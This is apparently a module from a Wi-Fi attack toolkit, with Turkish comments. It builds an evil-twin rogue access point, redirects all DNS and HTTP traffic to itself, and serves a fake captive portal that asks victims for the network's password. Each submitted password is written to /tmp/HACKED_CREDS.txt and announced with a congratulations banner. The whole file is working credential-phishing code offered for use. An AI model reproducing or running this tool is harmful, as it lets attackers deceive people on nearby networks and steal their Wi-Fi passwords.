import os
import subprocess
import time
import threading
import sys
from modules import radar, i18n, engine
t = i18n.t

def cleanup(iface=None):
    print(t("eviltwin_cleanup"))
    subprocess.run(["sudo", "killall", "-9", "hostapd", "dnsmasq"], capture_output=True)
    for f in ["/tmp/hostapd.conf", "/tmp/dnsmasq.conf", "/tmp/hostapd.log", "/tmp/flask_portal.py", "/tmp/pure_portal.py"]:
        try:
            if os.path.exists(f): os.remove(f)
        except: pass
    subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"], capture_output=True)
    subprocess.run(["sudo", "iptables", "-F"], capture_output=True)
    subprocess.run(["sudo", "iptables", "-t", "nat", "-F"], capture_output=True)
    
    if iface and os.path.exists("/usr/bin/nmcli"):
        subprocess.run(["sudo", "nmcli", "device", "set", iface, "managed", "yes"], capture_output=True)
    
    # Fedora/Firewalld desteği (Opsiyonel: Eğer kapatılmışsa geri aç)
    if any(os.path.exists(p) for p in ["/usr/bin/firewalld", "/usr/sbin/firewalld"]):
        engine.manage_service("firewalld", "start")
    
    # DNS Çakışması Çözümü (systemd-resolved)
    if any(os.path.exists(p) for p in ["/usr/lib/systemd/systemd-resolved", "/usr/bin/resolvectl"]):
        engine.manage_service("systemd-resolved", "start")
    
    # IPv6 Restorasyonu
    if iface: engine.set_ipv6(iface, True)

    # Terminal ayarlarını sıfırla
    os.system("stty sane")
        
    print(t("eviltwin_cleanup_done"))






# --- PURE PYTHON CAPTIVE PORTAL (Dış Bağımlılık Yok) ---
def launch_portal(ssid):
    # Flask bağımlılığını tamamen ortadan kaldırıyoruz! %100 Saf Python HTTP Sunucusu
    portal_code = f"""
import http.server
import socketserver
import urllib.parse
import os
import sys

PORT = 80
SSID = "{ssid}"

HTML = '''<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{ssid} - {t('portal_h2')}</title>
    <style>
        body {{ font-family: -apple-system, system-ui, sans-serif; background: #f4f6f8; margin: 0; padding: 20px; text-align: center; color: #333; }}
        .container {{ background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); max-width: 400px; margin: 50px auto; }}
        h2 {{ color: #d32f2f; }}
        input {{ width: 100%; padding: 12px; margin: 15px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }}
        button {{ background: #007bff; color: white; border: none; padding: 12px 20px; border-radius: 4px; cursor: pointer; width: 100%; font-size: 16px; }}
        button:hover {{ background: #0056b3; }}
        .footer {{ margin-top: 20px; font-size: 12px; color: #777; }}
    </style>
</head>
<body>
    <div class="container">
        <h2>{t('portal_h2')}</h2>
        <p>{t('portal_p1')}</p>
        <p>{t('portal_p2', ssid=ssid)}</p>
        <form method="POST" action="/verify">
            <input type="password" name="password" placeholder="{t('portal_placeholder')}" required minlength="8">
            <button type="submit">{t('portal_button')}</button>
        </form>
        <div class="footer">{t('portal_footer')}</div>
    </div>
</body>
</html>'''

class CaptiveHandler(http.server.BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass # Konsolu kirletmemek için logları kapatıyoruz
        
    def do_GET(self):
        # Android/iOS ağa bağlandığında ne sorarsa sorsun direkt Portalı veriyoruz!
        self.send_response(200)
        self.send_header('Content-type', 'text/html; charset=utf-8')
        self.end_headers()
        self.wfile.write(HTML.encode('utf-8'))

    def do_POST(self):
        if self.path == "/verify":
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')
            parsed = urllib.parse.parse_qs(post_data)
            if 'password' in parsed:
                pwd = parsed['password'][0]
                with open("/tmp/HACKED_CREDS.txt", "a") as f:
                    f.write(f"SSID: {{SSID}} | PASSWORD: {{pwd}}\\n")
            
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
            success_msg = '''<h1>{t('portal_success_title')}</h1><p>{t('portal_success_p')}</p>'''
            self.wfile.write(success_msg.encode('utf-8'))

# Port 80 üzerinde sunucuyu başlat ve çökmeleri engelle (allow_reuse_address)
class ThreadingTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    allow_reuse_address = True

try:
    server = ThreadingTCPServer(("", PORT), CaptiveHandler)
    server.serve_forever()
except Exception as e:
    pass
"""
    with open("/tmp/pure_portal.py", "w") as f:
        f.write(portal_code)
    print(t("eviltwin_portal_starting"))
    
    # Port 80 temizliği garanti altına alınıyor
    if any(os.path.exists(p) for p in ["/usr/bin/fuser", "/bin/fuser", "/usr/sbin/fuser"]):
        subprocess.run(["sudo", "fuser", "-k", "80/tcp"], capture_output=True)
    else:
        os.system("sudo lsof -t -i:80 | xargs -r sudo kill -9 > /dev/null 2>&1")
    
    # Flask olmadan, garantili saf Python ile çalıştırıyoruz!
    log_file = open("/tmp/portal_debug.log", "w")
    return subprocess.Popen(["sudo", sys.executable, "/tmp/pure_portal.py"], stdout=log_file, stderr=log_file)



# --- ROUGE AP SETUP (Sahte Erişim Noktası) ---
def start_evil_twin(iface, ssid, channel):
    # 1. Fedora DNS ve Port 53 Temizliği (Daha sert temizlik)
    subprocess.run(["sudo", "systemctl", "stop", "systemd-resolved"], capture_output=True)
    os.system("sudo fuser -k 53/udp > /dev/null 2>&1")
    os.system("sudo fuser -k 53/tcp > /dev/null 2>&1")

    ssid = radar.clean_ssid(ssid)
    print(t("eviltwin_prep", ssid=ssid))
    
    # 2. NetworkManager'ı bu karttan tamamen kopar (En önemli adım!)
    if os.path.exists("/usr/bin/nmcli"):
        subprocess.run(["sudo", "nmcli", "device", "set", iface, "managed", "no"], capture_output=True)
    
    # Diğer servisleri durdur (Sadece gerekli olanları)
    subprocess.run(["sudo", "killall", "-9", "hostapd", "dnsmasq"], capture_output=True)
    if os.path.exists("/usr/sbin/nft") or os.path.exists("/usr/bin/nft"):
        subprocess.run(["sudo", "nft", "flush", "ruleset"], capture_output=True)

    subprocess.run(["sudo", "rfkill", "unblock", "wifi"])
    time.sleep(1)
    
    # 3. Kartı temiz bir 'Managed' ama 'Bağlantısız' moda çek
    engine.run_cmd(["sudo", "ip", "link", "set", iface, "down"])
    engine.run_cmd(["sudo", "iw", "dev", iface, "set", "type", "managed"])
    engine.run_cmd(["sudo", "ip", "addr", "flush", "dev", iface]) # Eski IP'leri temizle
    engine.run_cmd(["sudo", "ip", "addr", "add", "10.0.0.1/24", "dev", iface])
    engine.run_cmd(["sudo", "ip", "link", "set", iface, "up"])

    # Fedora/Firewalld kapat (iptables'ı ezmemesi için)
    if engine.is_service_active("firewalld"):
        engine.manage_service("firewalld", "stop")

    # DNS Çakışması Çözümü (systemd-resolved Port 53'ü işgal eder)
    if engine.is_service_active("systemd-resolved"):
        print(t("eviltwin_resolved_stop"))
        engine.manage_service("systemd-resolved", "stop")

    # IPv6 Kapatma (Telefonların IPv6 üzerinden internet kontrolü yapmasını engellemek için)
    print(t("eviltwin_ipv6_stop"))
    engine.set_ipv6(iface, False)


    # IP ve Yönlendirme
    subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"])
    subprocess.run(["sudo", "iptables", "-F"])
    subprocess.run(["sudo", "iptables", "-t", "nat", "-F"])
    # IP Forwarding Hatası Check
    subprocess.run(["sudo", "iptables", "-I", "FORWARD", "-j", "ACCEPT"])
    
    # Açık İzinler (Fedora/Modern Distro Güvenlik Duvarı Engeli İçin)
    subprocess.run(["sudo", "iptables", "-I", "INPUT", "-p", "udp", "--dport", "53", "-j", "ACCEPT"]) # DNS
    subprocess.run(["sudo", "iptables", "-I", "INPUT", "-p", "udp", "--dport", "67", "-j", "ACCEPT"]) # DHCP
    subprocess.run(["sudo", "iptables", "-I", "INPUT", "-p", "tcp", "--dport", "80", "-j", "ACCEPT"]) # HTTP Portal
    subprocess.run(["sudo", "iptables", "-I", "INPUT", "-p", "tcp", "--dport", "443", "-j", "REJECT", "--reject-with", "tcp-reset"]) # HTTPS Reddet (Hızlı Fallback)
    
    # Yönlendirme ve DNS Hijacking
    subprocess.run(["sudo", "iptables", "-t", "nat", "-I", "PREROUTING", "-p", "udp", "--dport", "53", "-j", "DNAT", "--to-destination", "10.0.0.1:53"])
    subprocess.run(["sudo", "iptables", "-t", "nat", "-I", "PREROUTING", "-p", "tcp", "--dport", "80", "-j", "DNAT", "--to-destination", "10.0.0.1:80"])
    subprocess.run(["sudo", "iptables", "-t", "nat", "-I", "POSTROUTING", "-j", "MASQUERADE"])


    try:
        if int(channel) > 14:
            channel = "6"
    except:
        channel = "6"
    hostapd_conf = f"""interface={iface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""
    with open("/tmp/hostapd.conf", "w") as f:
        f.write(hostapd_conf)
    dnsmasq_conf = f"""interface={iface}
bind-interfaces
server=8.8.8.8
domain-needed
bogus-priv
no-resolv
dhcp-range=10.0.0.10,10.0.0.250,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
dhcp-option=114,http://10.0.0.1/
address=/#/10.0.0.1
"""

    with open("/tmp/dnsmasq.conf", "w") as f:
        f.write(dnsmasq_conf)
    ap_proc = None
    dns_proc = None
    flask_proc = None
    
    try:
        print(t("eviltwin_ap_starting"))
        ap_proc = subprocess.Popen(["hostapd", "/tmp/hostapd.conf"], stdout=open("/tmp/hostapd.log", "w"), stderr=subprocess.STDOUT)
        time.sleep(3)
        
        color_yellow = '\033[93m'
        color_end = '\033[0m'
        print(f"\n    {color_yellow}[HOSTAPD BAŞLATMA LOGLARI]{color_end}")
        try:
            if os.path.exists("/tmp/hostapd.log"):
                with open("/tmp/hostapd.log", "r") as logf:
                    lines = logf.readlines()[:5]
                    for line in lines:
                        print(f"        {line.strip()}")
        except: pass
        print(f"    {color_yellow}{'-'*30}{color_end}\n")
        
        if ap_proc.poll() is not None:
            print(t("eviltwin_ap_error"))
            print(t("eviltwin_ap_error_desc"))
            return # cleanup finally bloğunda otomatik çalışacak!
            
        print(t("eviltwin_dns_starting"))
        if any(os.path.exists(p) for p in ["/usr/bin/fuser", "/bin/fuser", "/usr/sbin/fuser"]):
            subprocess.run(["sudo", "fuser", "-k", "53/udp"], capture_output=True)

        dns_proc = subprocess.Popen(["sudo", "dnsmasq", "-C", "/tmp/dnsmasq.conf", "-d"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(2)
        
        flask_proc = launch_portal(ssid)
        try: os.remove("/tmp/HACKED_CREDS.txt")
        except: pass
        
        print(t("eviltwin_active"))
        print(t("eviltwin_active_ssid", ssid=ssid))
        print(t("eviltwin_active_hint"))
        print(t("eviltwin_stop_hint"))
        os.system("stty sane")

        # Şifre bekleme döngüsü
        while True:
            time.sleep(1)
            if os.path.exists("/tmp/HACKED_CREDS.txt"):
                with open("/tmp/HACKED_CREDS.txt", "r") as f:
                    content = f.read()
                    print(f"\n\n\033[91m{'='*50}\033[0m")
                    print(f"\033[1m\033[92m[!!!] TEBRİKLER, ŞİFRE YAKALANDI!\033[0m")
                    print(f"\033[93m{content.strip()}\033[0m")
                    print(f"\033[91m{'='*50}\033[0m")
                try: os.remove("/tmp/HACKED_CREDS.txt")
                except: pass
                print(t("eviltwin_victim_exit"))
                time.sleep(3)
                break
                
    except KeyboardInterrupt:
        print(t("eviltwin_cancel"))
        
    finally:
        # DÜZELTME: Güvenli kapatma. Değişken varsa ve process çalışıyorsa kapat.
        if flask_proc: flask_proc.terminate()
        if ap_proc: ap_proc.terminate()
        if dns_proc: dns_proc.terminate()
        
        # Her ne olursa olsun Wi-Fi kartını eski haline getir!
        cleanup(iface)
